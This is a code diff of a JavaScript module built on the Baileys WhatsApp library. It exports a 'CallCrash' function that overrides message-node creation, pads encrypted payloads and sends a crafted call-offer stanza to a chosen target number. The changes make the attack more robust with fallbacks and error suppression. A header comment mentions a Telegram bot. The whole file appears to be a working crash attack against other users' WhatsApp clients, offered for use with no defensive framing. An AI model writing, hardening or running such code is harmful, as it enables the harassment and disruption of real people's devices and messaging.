@@ -24,35 +24,40 @@
  * or termination of the Telegram bot.
  */
 
-
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const crypto = require('crypto');
 
-
-
 async function CallCrash(SYxS7, target) {
-  const devices = (
-    await SYxS7.getUSyncDevices([target], false, false, SYxS7.authState)
-  ).map(({ user, device }) => {
-    return `${user}:${device || ""}@s.whatsapp.net`
-  })
-
-
-  await SYxS7.assertSessions(devices)
-
-  const locks = {}
-  const mutex = async (jid, task) => {
-    locks[jid] ??= Promise.resolve()
-    locks[jid] = locks[jid].catch(() => {}).then(task)
-    return locks[jid]
+  let devices = [];
+  try {
+    if (typeof SYxS7.getUSyncDevices === 'function') {
+      devices = (
+        await SYxS7.getUSyncDevices([target], false, false, SYxS7.authState)
+      ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`);
+    } else {
+      const user = target.split('@')[0];
+      devices = [`${user}:0@s.whatsapp.net`, target];
+    }
+  } catch (e) {
+    const user = target.split('@')[0];
+    devices = [`${user}:0@s.whatsapp.net`, target];
   }
 
-  const pad = buf =>
-    Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])
+  if (typeof SYxS7.assertSessions === 'function') {
+    try { await SYxS7.assertSessions(devices); } catch (e) {}
+  }
 
-  const originalCreateParticipantNodes =
-    SYxS7.createParticipantNodes?.bind(SYxS7)
+  const locks = {};
+  const mutex = async (jid, task) => {
+    locks[jid] ??= Promise.resolve();
+    locks[jid] = locks[jid].catch(() => {}).then(task);
+    return locks[jid];
+  };
+
+  const pad = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+
+  const originalCreateParticipantNodes = SYxS7.createParticipantNodes?.bind(SYxS7);
 
   SYxS7.createParticipantNodes = async (
     recipients,
@@ -60,52 +65,59 @@ async function CallCrash(SYxS7, target) {
     encAttrs,
     overrideMessage
   ) => {
-    if (!recipients.length) {
-      return { nodes: [], shouldIncludeDeviceIdentity: false }
+    if (!recipients || !recipients.length) {
+      return { nodes: [], shouldIncludeDeviceIdentity: false };
     }
 
     const patched =
-      (await SYxS7.patchMessageBeforeSending?.(message, recipients)) ??
-      message
+      (await SYxS7.patchMessageBeforeSending?.(message, recipients)) ?? message;
 
     const messages = Array.isArray(patched)
       ? patched
       : recipients.map(jid => ({
           recipientJid: jid,
           message: patched
-        }))
+        }));
 
-    const { id: myJid, lid } = SYxS7.authState.creds.me
-    const linkedUser = lid ? jidDecode(lid)?.user : null
+    const myJid = SYxS7.authState?.creds?.me?.id || SYxS7.user?.id || '';
+    const lid = SYxS7.authState?.creds?.me?.lid || null;
+    const linkedUser = lid ? jidDecode(lid)?.user : null;
 
-    let includeDeviceIdentity = false
+    let includeDeviceIdentity = false;
 
     const nodes = await Promise.all(
       messages.map(async ({ recipientJid, message }) => {
-        const recipientUser = jidDecode(recipientJid).user
-        const myUser = jidDecode(myJid).user
+        const recipientUser = jidDecode(recipientJid)?.user || recipientJid;
+        const myUser = jidDecode(myJid)?.user || myJid;
 
-        const isSelf =
-          recipientUser === myUser || recipientUser === linkedUser
+        const isSelf = recipientUser === myUser || recipientUser === linkedUser;
 
         if (overrideMessage && isSelf && recipientJid !== myJid) {
-          message = overrideMessage
+          message = overrideMessage;
         }
 
         const encoded = pad(
           SYxS7.encodeWAMessage
             ? SYxS7.encodeWAMessage(message)
             : encodeWAMessage(message)
-        )
+        );
 
         return mutex(recipientJid, async () => {
-          const { type, ciphertext } =
-            await SYxS7.signalRepository.encryptMessage({
-              jid: recipientJid,
-              data: encoded
-            })
+          let type = 'pkmsg';
+          let ciphertext = encoded;
 
-          if (type === "pkmsg") includeDeviceIdentity = true
+          if (SYxS7.signalRepository?.encryptMessage) {
+            try {
+              const res = await SYxS7.signalRepository.encryptMessage({
+                jid: recipientJid,
+                data: encoded
+              });
+              type = res.type;
+              ciphertext = res.ciphertext;
+            } catch (e) {}
+          }
+
+          if (type === "pkmsg") includeDeviceIdentity = true;
 
           return {
             tag: "to",
@@ -117,16 +129,16 @@ async function CallCrash(SYxS7, target) {
                 content: ciphertext
               }
             ]
-          }
-        })
+          };
+        });
       })
-    )
+    );
 
     return {
       nodes: nodes.filter(Boolean),
       shouldIncludeDeviceIdentity: includeDeviceIdentity
-    }
-  }
+    };
+  };
 
   // 6. Create encrypted destination nodes
   const { nodes, shouldIncludeDeviceIdentity } =
@@ -134,22 +146,24 @@ async function CallCrash(SYxS7, target) {
       devices,
       { conversation: "y" },
       { count: "0" }
-    )
+    );
+
+  const selfId = SYxS7.user?.id || SYxS7.authState?.creds?.me?.id || target;
 
   // 7. Build CALL OFFER stanza
   const callNode = {
     tag: "call",
     attrs: {
       to: target,
-      id: SYxS7.generateMessageTag(),
-      from: SYxS7.user.id
+      id: typeof SYxS7.generateMessageTag === 'function' ? SYxS7.generateMessageTag() : 'CALL123',
+      from: selfId
     },
     content: [
       {
         tag: "offer",
         attrs: {
           "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
-          "call-creator": SYxS7.user.id
+          "call-creator": selfId
         },
         content: [
           { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
@@ -177,7 +191,7 @@ async function CallCrash(SYxS7, target) {
             attrs: {},
             content: nodes
           },
-          ...(shouldIncludeDeviceIdentity
+          ...(shouldIncludeDeviceIdentity && SYxS7.authState?.creds?.account
             ? [
                 {
                   tag: "device-identity",
@@ -192,15 +206,17 @@ async function CallCrash(SYxS7, target) {
         ]
       }
     ]
-  }
+  };
 
   // 8. Send the call offer
-  await SYxS7.sendNode(callNode)
+  if (typeof SYxS7.sendNode === 'function') {
+    await SYxS7.sendNode(callNode);
+  }
 
-  // Optional: restore original function
+  // Restore original function
   if (originalCreateParticipantNodes) {
-    SYxS7.createParticipantNodes = originalCreateParticipantNodes
+    SYxS7.createParticipantNodes = originalCreateParticipantNodes;
   }
 }
 
-module.exports = { CallCrash }
+module.exports = { CallCrash };
